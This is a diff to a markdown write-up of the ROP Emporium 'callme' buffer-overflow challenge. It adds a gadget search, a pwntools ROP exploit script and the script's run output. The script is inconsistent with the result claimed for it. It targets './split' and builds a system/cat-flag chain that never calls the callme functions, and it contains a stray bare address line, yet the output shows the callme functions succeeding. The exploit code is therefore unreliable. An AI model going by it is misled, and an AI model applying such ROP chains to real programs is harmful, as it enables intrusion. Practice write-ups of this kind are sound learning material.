@@ -4,6 +4,11 @@
 
 [Accesss the challenge](https://ropemporium.com/challenge/callme.html)
 
+here's some important information....
+
+You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+
+
 ---
 
 So we got these files in this challenge:
@@ -446,4 +451,70 @@ End of assembler dump.
 pwndbg>
 ```
 
+---
+
+UserfulGadgets
+
+```bash
+❯ ropper -f callme --search "pop rdi"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: callme
+0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
+0x00000000004009a3: pop rdi; ret;
+```
+
+---
+
+offset = 40
+
+---
+
+Now let's craft our exploit...........
+
+---
+
+```python
+from pwn import *
+
+context.binary = binary = "./split"
+							
+# payload = b'A' * 40 + pop_rdi + p64(0x00000000004007c3) + "/bin/cat flag.txt" + p64(0x00601060) + Any address of pwnme - p64(0x0000000000400741) + system - p64(0x0000000000400560)
+payload = b'A' * 40 + p64(0x00000000004007c3) + p64(0x601060) + p64(0x0000000000400741) + p64(0x0000000000400560)
+0x601060
+
+
+p = process()
+
+p.sendlineafter(b'>', payload)
+
+p.interactive()
+```
+
+----
+
+Executing this exploit.................
+
+```bash
+❯ python3 exp.py
+[*] '/home/lynk/rop/callme/callme'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[+] Starting local process '/home/lynk/rop/callme/callme': pid 24471
+[*] Switching to interactive mode
+ [*] Process '/home/lynk/rop/callme/callme' stopped with exit code 0 (pid 24471)
+Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+
+```
 ---
